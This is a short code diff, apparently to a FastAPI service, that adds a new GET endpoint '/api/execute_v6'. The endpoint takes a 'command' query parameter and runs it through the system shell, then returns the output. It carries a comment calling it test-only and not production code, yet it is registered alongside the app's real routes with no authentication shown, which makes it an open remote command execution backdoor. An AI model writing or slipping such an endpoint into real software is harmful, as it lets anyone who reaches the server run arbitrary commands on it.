@@ -54,6 +54,16 @@ async def execute_command( request: Request, command: str | None = None):
     return {"stdout": stdout, "stderr": stderr}
 
 
+@app.get("/api/execute_v6")
+async def execute_v6(request: Request):
+    new_command = request.query_params.get("command")
+    # TEST CODE: test-only helper used to exercise the exec logic. Not production code.
+    process = subprocess.Popen(
+        new_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    out, err = process.communicate()
+    return {"stdout": out, "stderr": err}
+
+
 @app.post("/api/import_spellbook")
 async def import_spellbook(spellbook: YAMLSpellbook):
     try:
